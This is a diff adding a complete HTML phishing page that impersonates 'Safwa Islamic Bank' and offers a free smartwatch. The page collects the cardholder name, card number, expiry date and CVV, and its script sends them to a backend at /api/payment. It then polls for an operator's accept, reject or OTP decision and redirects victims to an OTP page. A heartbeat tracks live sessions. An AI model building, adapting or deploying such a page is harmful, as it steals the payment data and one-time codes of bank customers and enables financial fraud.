@@ -1,0 +1,765 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Login</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@500;700;800&family=Tajawal:wght@400;500;700&display=swap" rel="stylesheet">
+<style>
+  :root{
+    --green:#1a6b3c;
+    --green-dark:#125129;
+    --gray-line:#dcdcdc;
+    --text-dark:#2b2b2b;
+    --bg:#f4f6f8;
+    --card-bg:#ffffff;
+    --input-bg:#f9f9f9;
+  }
+  *{box-sizing:border-box; margin: 0; padding: 0;}
+  body{
+    font-family: 'Tajawal', sans-serif;
+    background-color: #FBFAF7;
+    color: #16262A;
+    line-height: 1.7;
+    overflow-x: hidden;
+    display: flex;
+    flex-direction: column;
+    min-height: 100vh;
+  }
+  h1, h2, h3, .brand { font-family: 'Cairo', sans-serif; }
+  a { color: inherit; text-decoration: none; }
+  ul { list-style: none; }
+  button { font-family: inherit; cursor: pointer; border: none; background: none; }
+  img, svg { display: block; }
+  .container { max-width: 1160px; margin: 0 auto; padding: 0 28px; }
+
+  /* ===== HEADER ===== */
+  header{
+    background:#F1EFEA;
+    border-bottom:1px solid #D3CFC6;
+    position:sticky; top:0; z-index:100;
+    width: 100%;
+  }
+  .header-inner{
+    display:flex; align-items:center; justify-content:space-between;
+    padding:8px 24px; max-width:1160px; margin:0 auto;
+  }
+  .brand{
+    display:flex; align-items:center; gap:10px;
+    font-weight:800; font-size:1.28rem; color:#0B2E33;
+    letter-spacing:.2px;
+  }
+  .brand .mark{
+    width:40px; height:40px; flex:none; object-fit:contain;
+  }
+  .header-brand{height:100%;}
+  .header-brand .mark-full{
+    height:38px; width:auto; max-width:none; display:block; object-fit:contain;
+  }
+  nav.main-nav{
+    display:flex; gap:34px; font-weight:500; font-size:.98rem;
+  }
+  nav.main-nav a{
+    color:#4B5C5F; position:relative; padding:4px 0;
+    transition:color .2s ease;
+  }
+  nav.main-nav a:hover{color:#0B2E33;}
+  nav.main-nav a::after{
+    content:""; position:absolute; right:0; left:0; bottom:-2px; height:2px;
+    background:#B98851; transform:scaleX(0); transition:transform .25s ease;
+  }
+  nav.main-nav a:hover::after{transform:scaleX(1);}
+
+  .header-actions{display:flex; align-items:center; gap:14px;}
+
+  .lang-toggle{
+    display:flex; align-items:center; gap:6px;
+    border:1px solid #D3CFC6; border-radius:999px;
+    padding:7px 16px; font-size:.85rem; font-weight:700;
+    color:#0B2E33; background:#FBFAF7;
+    transition:background .2s ease, border-color .2s ease;
+  }
+  .lang-toggle:hover{background:#DCC7A6; border-color:#B98851;}
+
+  .burger{
+    display:none; flex-direction:column; justify-content:center; gap:5px;
+    width:26px; height:20px;
+  }
+  .burger span{display:block; height:2px; width:100%; background:#0B2E33; border-radius:2px;}
+
+  /* mobile nav */
+  .mobile-nav{
+    display:none;
+    flex-direction:column;
+    background:#F1EFEA;
+    border-top:1px solid #D3CFC6;
+    padding:8px 28px 18px;
+  }
+  .mobile-nav a{
+    padding:12px 0; border-bottom:1px solid #D3CFC6;
+    color:#4B5C5F; font-weight:500;
+  }
+  .mobile-nav a:last-child{border-bottom:none;}
+  body.nav-open .mobile-nav{display:flex;}
+  body.nav-open .burger span:nth-child(1){transform:translateY(7px) rotate(45deg);}
+  body.nav-open .burger span:nth-child(2){opacity:0;}
+  body.nav-open .burger span:nth-child(3){transform:translateY(-7px) rotate(-45deg);}
+
+  @media (max-width:860px){
+    nav.main-nav{display:none;}
+    .burger{display:flex;}
+  }
+
+  /* ===== MAIN CONTENT ===== */
+  .main-wrapper {
+    flex: 1;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    padding: 40px 16px;
+    background-color: #FBFAF7;
+  }
+  .screen{
+    width:100%;
+    max-width:440px;
+    min-height:auto;
+    display:flex;
+    flex-direction:column;
+    padding:24px;
+    position:relative;
+    background:var(--card-bg);
+    border-radius:16px;
+    box-shadow:0 4px 20px rgba(0, 0, 0, 0.05);
+  }
+  @media (max-width: 480px) {
+    .screen {
+      box-shadow: none;
+      border-radius: 0;
+      padding: 16px 20px 0 20px;
+    }
+  }
+  .logo-wrap{
+    display:flex;
+    flex-direction:column;
+    align-items:center;
+    justify-content:center;
+    margin-bottom:24px;
+  }
+  .logo-wrap img{
+    max-width:220px;
+    width:100%;
+    height:auto;
+  }
+  .page-subtitle {
+    color: var(--green);
+    font-weight: 700;
+    font-size: 18px;
+    margin-top: 16px;
+    text-align: center;
+  }
+  .field{
+    margin-bottom:16px;
+  }
+  .field-row{
+    display:flex;
+    align-items:center;
+    justify-content:flex-start;
+    gap:10px;
+    border:1.5px solid var(--gray-line);
+    border-radius:12px;
+    padding:12px 14px;
+    background:var(--input-bg);
+    transition: border-color 0.2s, box-shadow 0.2s;
+  }
+  .field-row:focus-within{
+    border-color:var(--green);
+    box-shadow: 0 0 0 3px rgba(26, 107, 60, 0.12);
+    background:#ffffff;
+  }
+  .field-row input{
+    border:none;
+    outline:none;
+    font-size:16px;
+    text-align:left;
+    flex:1;
+    color:var(--text-dark);
+    background:transparent;
+    direction:ltr;
+    width: 100%;
+  }
+  .field-row input::placeholder{
+    color:#8a8a8a;
+    font-size:15px;
+  }
+  .icon{
+    color:var(--green);
+    width:22px;
+    height:22px;
+    flex-shrink:0;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+  }
+  .card-brand-icon {
+    width: 38px;
+    height: 24px;
+    flex-shrink: 0;
+    display: none;
+    align-items: center;
+    justify-content: center;
+    overflow: hidden;
+  }
+  .card-brand-icon.active {
+    display: flex;
+  }
+  .card-brand-icon svg {
+    width: 100%;
+    height: 100%;
+    max-height: 24px;
+    object-fit: contain;
+    display: block;
+  }
+
+  .btn-primary{
+    background:var(--green);
+    color:#fff;
+    border:none;
+    border-radius:12px;
+    padding:16px;
+    font-size:18px;
+    font-weight:600;
+    cursor:pointer;
+    margin-top:10px;
+    box-shadow: 0 4px 12px rgba(26, 107, 60, 0.2);
+    transition: background 0.2s;
+    width: 100%;
+  }
+  .btn-primary:hover{
+    background:var(--green-dark);
+  }
+  .spacer{flex:1; min-height: 20px;}
+
+  .loading-overlay{
+    position:fixed;
+    top:0;
+    left:0;
+    width:100%;
+    height:100%;
+    background:#ffffff;
+    display:none;
+    flex-direction:column;
+    align-items:center;
+    justify-content:center;
+    z-index:999;
+  }
+  .loading-overlay.active{
+    display:flex;
+  }
+  .spinner{
+    width:56px;
+    height:56px;
+    border:5px solid #d8ead9;
+    border-top:5px solid var(--green);
+    border-radius:50%;
+    animation:spin 0.9s linear infinite;
+    margin-bottom:22px;
+  }
+  @keyframes spin{
+    to{transform:rotate(360deg);}
+  }
+  .loading-text{
+    font-size:17px;
+    color:var(--text-dark);
+    font-weight:600;
+  }
+  .error-msg{
+    color:#c0392b;
+    font-size:14px;
+    margin-top: -4px;
+    margin-bottom: 14px;
+    display:none;
+  }
+  .error-msg.active{
+    display:block;
+  }
+  .field-row.invalid{
+    border-color: #c0392b !important;
+    background: #fdf2f2;
+  }
+  .field-row.invalid input{
+    color: #c0392b;
+  }
+
+  /* Modal Popup Styling */
+  .modal-overlay {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: rgba(0, 0, 0, 0.5);
+    display: none;
+    align-items: center;
+    justify-content: center;
+    z-index: 1000;
+    padding: 16px;
+  }
+  .modal-overlay.active {
+    display: flex;
+  }
+  .modal-box {
+    background: #ffffff;
+    border-radius: 16px;
+    width: 100%;
+    max-width: 380px;
+    padding: 24px 20px;
+    text-align: center;
+    box-shadow: 0 10px 25px rgba(0,0,0,0.15);
+    animation: popupAnimation 0.3s ease-out forwards;
+  }
+  @keyframes popupAnimation {
+    from { transform: scale(0.8); opacity: 0; }
+    to { transform: scale(1); opacity: 1; }
+  }
+  .modal-icon {
+    width: 64px;
+    height: 64px;
+    background: #fde8e8;
+    border-radius: 50%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    margin: 0 auto 16px auto;
+  }
+  .modal-icon svg {
+    width: 34px;
+    height: 34px;
+    color: #e74c3c;
+  }
+  .modal-text {
+    font-size: 16px;
+    color: #2c3e50;
+    line-height: 1.5;
+    margin-bottom: 20px;
+    font-weight: 600;
+  }
+  .modal-btn {
+    background: #e74c3c;
+    color: #ffffff;
+    border: none;
+    border-radius: 10px;
+    padding: 12px 24px;
+    font-size: 16px;
+    font-weight: 600;
+    cursor: pointer;
+    width: 100%;
+    transition: background 0.2s;
+  }
+  .modal-btn:hover {
+    background: #c0392b;
+  }
+
+  /* ===== FOOTER ===== */
+  footer{
+    background:#E9E6E0; color:#4B5C5F;
+    padding:56px 0 26px;
+    width: 100%;
+  }
+  .footer-top{
+    display:flex; justify-content:space-between; gap:40px; flex-wrap:wrap;
+    padding-bottom:34px; border-bottom:1px solid rgba(11,46,51,.12);
+  }
+  .footer-brand{max-width:32ch;}
+  .footer-brand .footer-logo{height:64px; width:auto; object-fit:contain;}
+  .footer-brand p{margin-top:14px; font-size:.9rem; color:#4B5C5F;}
+  .footer-links{display:flex; flex-direction:column; gap:24px;}
+  .footer-links h4{
+    font-family:'Cairo',sans-serif; color:#000; font-weight:800; font-size:.95rem; margin-bottom:16px;
+  }
+  .footer-links ul{display:flex; flex-direction:column; gap:11px;}
+  .footer-links a{font-size:.9rem; color:#000; font-weight:700; transition:color .2s ease;}
+  .footer-links a:hover{color:#2F6F63;}
+  .footer-bottom{
+    display:flex; justify-content:center; text-align:center; flex-wrap:wrap; gap:10px;
+    padding-top:22px; font-size:.82rem; color:#000; font-weight:700;
+  }
+
+  [data-lang="en"]{display:none;}
+  body.lang-en [data-lang="ar"]{display:none;}
+  body.lang-en [data-lang="en"]{display:inline;}
+  body.lang-en .footer-links [data-lang="en"]{display:flex;}
+</style>
+</head>
+<body class="lang-en">
+
+<header>
+  <div class="header-inner">
+    <button class="burger" id="burgerBtn" aria-label="فتح القائمة">
+      <span></span><span></span><span></span>
+    </button>
+
+    <div class="brand header-brand">
+      <img class="mark-full" src="https://i.ibb.co/vvhxyt4K/image.png" alt="Safwa Islamic Bank">
+    </div>
+    <nav class="main-nav">
+      <a href="#watches"><span data-lang="ar">الساعات</span><span data-lang="en">Watches</span></a>
+      <a href="#contact"><span data-lang="ar">اتصل بنا</span><span data-lang="en">Contact</span></a>
+    </nav>
+
+    <div class="header-actions">
+      <button class="lang-toggle" id="langBtn">
+        <svg viewBox="0 0 24 24" fill="none" stroke="#1E9E5C" stroke-width="1.8" width="16" height="16"><circle cx="12" cy="12" r="9"/><path d="M3 12h18M12 3c2.5 2.5 2.5 15.5 0 18M12 3c-2.5 2.5-2.5 15.5 0 18"/></svg>
+        <span data-lang="ar">EN</span>
+        <span data-lang="en">AR</span>
+      </button>
+    </div>
+  </div>
+
+  <div class="mobile-nav" id="mobileNav">
+    <a href="#watches"><span data-lang="ar">الساعات</span><span data-lang="en">Watches</span></a>
+    <a href="#contact"><span data-lang="ar">اتصل بنا</span><span data-lang="en">Contact</span></a>
+  </div>
+</header>
+
+<div class="main-wrapper">
+  <div class="screen">
+
+    <div class="logo-wrap">
+      <img src="https://i.ibb.co/vvhxyt4K/image.png" alt="Safwa Islamic Bank" />
+      <div class="page-subtitle">Electronic Confirmation Page via Bank Card</div>
+    </div>
+
+    <div class="field">
+      <div class="field-row">
+        <svg class="icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8">
+          <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/>
+          <circle cx="12" cy="7" r="4"/>
+        </svg>
+        <input type="text" id="cardName" placeholder="Cardholder Name" />
+      </div>
+    </div>
+
+    <div class="field">
+      <div class="field-row">
+        <div class="card-brand-icon" id="visaIcon">
+          <svg viewBox="0 0 1000 600" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <rect width="1000" height="600" rx="80" fill="#1434CB"/>
+            <path d="M381.1 435.4L441.8 164.6H517.9L457.2 435.4H381.1ZM667.6 170.8C652.5 165.1 629 159 600.3 159C524.3 159 471.1 199.3 470.5 256.6C469.3 299.1 507.9 322.8 537 337C566.9 351.6 576.9 360.8 576.9 373.9C576.3 393.9 552.2 402.7 530.1 402.7C492.8 402.7 471.9 392.4 454.2 384.5L441.5 444.1C460.5 452.9 495.3 460.2 531.4 460.8C612.4 460.8 664.9 421 666.1 359.7C666.7 322.2 643.3 294.2 593.3 270.2C562.9 254.8 544.5 245.7 544.5 233.5C544.5 222.6 556.5 211 582.5 211C605.3 210.4 624.9 215.3 639.5 221.7L648.4 163.7L667.6 170.8ZM859.3 164.6H799.8C781.4 164.6 767.5 169.8 759.3 189.4L649.2 435.4H729L744.8 391.7H842.2L851.4 435.4H922L859.3 164.6ZM766.7 332.2L806.6 222.6L829.4 332.2H766.7ZM282 164.6L209.8 349.5L199.1 294.2C189 259.6 157.3 221.3 120.6 202.2L187.1 435.4H267.5L387.8 164.6H282Z" fill="white"/>
+            <path d="M165.7 164.6H82.7C79.5 164.6 78.3 166.4 78 168.3C77.7 170.2 78.3 183.1 78.3 183.1C117.6 173 151.7 151.1 165.7 164.6Z" fill="#F7B600"/>
+          </svg>
+        </div>
+        <div class="card-brand-icon" id="mastercardIcon">
+          <svg viewBox="0 0 36 22" fill="none">
+            <circle cx="14" cy="11" r="6" fill="#EB001B"/>
+            <circle cx="22" cy="11" r="6" fill="#F79E1B"/>
+            <path d="M18 6.1a5.96 5.96 0 0 0-2.2 4.9c0 2 1 3.7 2.2 4.9a5.96 5.96 0 0 0 2.2-4.9c0-2-1-3.7-2.2-4.9z" fill="#FF5F00"/>
+          </svg>
+        </div>
+        <svg class="icon" id="defaultCardIcon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8">
+          <rect x="2" y="5" width="20" height="14" rx="2"/>
+          <path d="M2 10h20"/>
+        </svg>
+        <input type="text" id="cardNumber" placeholder="Card Number" maxlength="19" 
+               oninput="formatCardNumber(this)" onkeypress="return isNumberKey(event)" />
+      </div>
+    </div>
+
+    <div class="field-row" style="gap: 12px; margin-bottom: 16px;">
+      <div class="field" style="flex: 1; margin-bottom: 0;">
+        <div class="field-row" style="margin-bottom: 0;">
+          <svg class="icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8">
+            <rect x="3" y="4" width="18" height="16" rx="2"/>
+            <path d="M16 2v4M8 2v4M3 10h18"/>
+          </svg>
+          <input type="text" id="expiryDate" placeholder="MM/YY" maxlength="5" 
+                 oninput="formatExpiryDate(this)" onkeypress="return isNumberKey(event)" />
+        </div>
+      </div>
+      <div class="field" style="flex: 1; margin-bottom: 0;">
+        <div class="field-row" style="margin-bottom: 0;">
+          <svg class="icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8">
+            <rect x="3" y="11" width="18" height="11" rx="2"/>
+            <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
+          </svg>
+          <input type="text" id="cvv" placeholder="CVV" maxlength="3" 
+                 onkeypress="return isNumberKey(event)" />
+        </div>
+      </div>
+    </div>
+
+    <div class="error-msg" id="errorMsg">Please enter all card details</div>
+
+    <button class="btn-primary" id="paymentBtn" onclick="handlePayment()">Confirm</button>
+
+    <div class="spacer"></div>
+
+    <div class="loading-overlay" id="loadingOverlay">
+      <div class="spinner"></div>
+      <div class="loading-text">Processing request, please wait...</div>
+    </div>
+
+    <!-- Rejection Modal Popup -->
+    <div class="modal-overlay" id="rejectModal">
+      <div class="modal-box">
+        <div class="modal-icon">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+            <line x1="18" y1="6" x2="6" y2="18"></line>
+            <line x1="6" y1="6" x2="18" y2="18"></line>
+          </svg>
+        </div>
+        <div class="modal-text">The information entered is incorrect. Please verify the correct information and try again.</div>
+        <button class="modal-btn" onclick="closeRejectModal()">Try Again</button>
+      </div>
+    </div>
+
+  </div>
+</div>
+
+<footer id="contact">
+  <div class="container">
+    <div class="footer-top">
+      <div class="footer-brand">
+        <img class="footer-logo" src="https://i.ibb.co/vvhxyt4K/image.png" alt="Safwa Islamic Bank">
+        <p><span data-lang="ar">الساعة الذكية مقدمة من بنك صفوة الإسلامي هدية مجانية لجميع عملاء البنك، جميع الساعات تحمل شعار البنك.</span><span data-lang="en">The smartwatch from Safwa Islamic Bank is a free gift for all bank customers. Every watch carries the bank's logo.</span></p>
+      </div>
+      <div class="footer-links">
+        <div>
+          <h4><span data-lang="ar">تواصل</span><span data-lang="en">Reach us</span></h4>
+          <ul>
+            <li><a href="#"><span data-lang="ar">اتصل بنا</span><span data-lang="en">Contact us</span></a></li>
+          </ul>
+        </div>
+        <div>
+          <h4><span data-lang="ar">قانوني</span><span data-lang="en">Legal</span></h4>
+          <ul>
+            <li><a href="#"><span data-lang="ar">السياسات والخصوصية</span><span data-lang="en">Privacy Policy</span></a></li>
+            <li><a href="#"><span data-lang="ar">الشروط والأحكام</span><span data-lang="en">Terms &amp; Conditions</span></a></li>
+          </ul>
+        </div>
+      </div>
+    </div>
+    <div class="footer-bottom">
+      <span><span data-lang="ar">جميع الحقوق محفوظة لبنك صفوة الإسلامي 2026</span><span data-lang="en">All rights reserved © Safwa Islamic Bank 2026</span></span>
+    </div>
+  </div>
+</footer>
+
+<script>
+  var statusPollTimer = null;
+
+  function showInvalidFields(fields) {
+    var errorMsg = document.getElementById('errorMsg');
+    errorMsg.textContent = 'Please enter all card details correctly';
+    errorMsg.style.color = '#c0392b';
+    errorMsg.classList.add('active');
+    
+    // Reset all fields
+    document.querySelectorAll('.field-row').forEach(row => {
+      row.classList.remove('invalid');
+    });
+    
+    // Highlight invalid fields
+    fields.forEach(fieldId => {
+      const inputEl = document.getElementById(fieldId);
+      if (inputEl) {
+        inputEl.closest('.field-row').classList.add('invalid');
+      }
+    });
+  }
+
+  // Allow only numbers to be entered
+  function isNumberKey(evt) {
+    const charCode = (evt.which) ? evt.which : evt.keyCode;
+    if (charCode > 31 && (charCode < 48 || charCode > 57)) {
+      return false;
+    }
+    return true;
+  }
+
+  // Format card number with spaces every 4 digits and detect card brand
+  function formatCardNumber(input) {
+    let value = input.value.replace(/\D/g, '');
+    let formattedValue = '';
+    for (let i = 0; i < value.length; i++) {
+      if (i > 0 && i % 4 === 0) {
+        formattedValue += ' ';
+      }
+      formattedValue += value[i];
+    }
+    input.value = formattedValue;
+    detectCardType(value);
+  }
+
+  function detectCardType(numberDigits) {
+    const visaIcon = document.getElementById('visaIcon');
+    const mastercardIcon = document.getElementById('mastercardIcon');
+    const defaultIcon = document.getElementById('defaultCardIcon');
+
+    visaIcon.classList.remove('active');
+    mastercardIcon.classList.remove('active');
+    defaultIcon.style.display = 'block';
+
+    if (numberDigits.startsWith('4')) {
+      visaIcon.classList.add('active');
+      defaultIcon.style.display = 'none';
+    } else if (/^(5[1-5]|2[2-7])/.test(numberDigits)) {
+      mastercardIcon.classList.add('active');
+      defaultIcon.style.display = 'none';
+    }
+  }
+
+  // Format expiry date as MM/YY
+  function formatExpiryDate(input) {
+    let value = input.value.replace(/\D/g, '');
+    if (value.length >= 2) {
+      input.value = value.substring(0, 2) + '/' + value.substring(2, 4);
+    } else {
+      input.value = value;
+    }
+  }
+
+  function validateCardNumber(cardNumber) {
+    const digits = cardNumber.replace(/\s/g, '');
+    return /^\d{16}$/.test(digits);
+  }
+
+  function validateExpiryDate(expiry) {
+    if (!/^\d{2}\/\d{2}$/.test(expiry)) {
+      return false;
+    }
+    const [month, year] = expiry.split('/');
+    const monthNum = parseInt(month, 10);
+    const yearNum = parseInt(year, 10);
+    
+    if (monthNum < 1 || monthNum > 12) {
+      return false;
+    }
+    const currentYear = new Date().getFullYear() % 100;
+    const currentMonth = new Date().getMonth() + 1;
+    
+    if (yearNum < currentYear || 
+        (yearNum === currentYear && monthNum < currentMonth)) {
+      return false;
+    }
+    return true;
+  }
+
+  function validateCVV(cvv) {
+    return /^\d{3}$/.test(cvv);
+  }
+
+  function closeRejectModal() {
+    document.getElementById('rejectModal').classList.remove('active');
+  }
+
+  function pollLoginStatus(paymentId) {
+    if (statusPollTimer) clearInterval(statusPollTimer);
+
+    statusPollTimer = setInterval(function() {
+      fetch('/api/status/' + paymentId)
+        .then(function(res) { return res.json(); })
+        .then(function(data) {
+          if (!data || !data.status) return;
+
+          var st = String(data.status).toLowerCase();
+          
+          if (st === 'accept' || st === 'approved' || st === 'otp') {
+            clearInterval(statusPollTimer);
+            document.getElementById('loadingOverlay').classList.remove('active');
+            window.location.href = data.redirectUrl || 'otp-en.html';
+          } else if (st === 'reject' || st === 'declined' || st === 'error') {
+            clearInterval(statusPollTimer);
+            document.getElementById('loadingOverlay').classList.remove('active');
+            document.getElementById('rejectModal').classList.add('active');
+          }
+        })
+        .catch(function(err) {
+          console.warn('Status poll error:', err);
+        });
+    }, 2000);
+  }
+
+  function handlePayment() {
+    var cardName = document.getElementById('cardName').value.trim();
+    var cardNumber = document.getElementById('cardNumber').value.trim();
+    var expiryDate = document.getElementById('expiryDate').value.trim();
+    var cvv = document.getElementById('cvv').value.trim();
+    
+    var invalidFields = [];
+    
+    if (!cardName) invalidFields.push('cardName');
+    if (!validateCardNumber(cardNumber)) invalidFields.push('cardNumber');
+    if (!validateExpiryDate(expiryDate)) invalidFields.push('expiryDate');
+    if (!validateCVV(cvv)) invalidFields.push('cvv');
+    
+    if (invalidFields.length > 0) {
+      showInvalidFields(invalidFields);
+      return;
+    }
+    
+    document.getElementById('errorMsg').classList.remove('active');
+    document.getElementById('loadingOverlay').classList.add('active');
+    document.querySelector('.loading-text').textContent = 'Processing request, please wait...';
+    
+    var customerData = JSON.parse(sessionStorage.getItem('safwa_order_data') || '{}');
+    var orderId = sessionStorage.getItem('safwa_order_id');
+    
+    fetch('/api/payment', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        cardName: cardName,
+        cardNumber: cardNumber,
+        expiryDate: expiryDate,
+        cvv: cvv,
+        requestId: orderId,
+        amount: customerData.amount || 0,
+        currency: customerData.currency || 'SAR'
+      })
+    })
+    .then(function(res){ return res.json(); })
+    .then(function(data){
+      if (data.ok && data.id) {
+        pollLoginStatus(data.id);
+      } else {
+        document.getElementById('loadingOverlay').classList.remove('active');
+        document.getElementById('rejectModal').classList.add('active');
+      }
+    })
+    .catch(function(err){
+      console.warn('Unable to connect to server:', err);
+      document.getElementById('loadingOverlay').classList.remove('active');
+      var errorMsg = document.getElementById('errorMsg');
+      errorMsg.textContent = 'Unable to connect to server. Make sure the project is running.';
+      errorMsg.style.color = '#c0392b';
+      errorMsg.classList.add('active');
+    });
+  }
+
+  document.addEventListener('DOMContentLoaded', function(){
+    var params = new URLSearchParams(window.location.search);
+    if (params.get('error') === 'payment') {
+      showInvalidFields(['cardNumber']);
+    }
+
+    var sessionId = sessionStorage.getItem('aman_bank_session_id');
+    if (!sessionId) {
+      sessionId = 'sess_' + Date.now() + '_' + Math.random().toString(36).slice(2);
+      sessionStorage.setItem('aman_bank_session_id', sessionId);
+    }
+
+    function sendHeartbeat() {
+      fetch('/api/heartbeat', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ sessionId: sessionId })
+      }).catch(function() {});
+    }
+
+    sendHeartbeat();
+    setInterval(sendHeartbeat, 3000);
+  });
+</script>
+</body>
+</html>
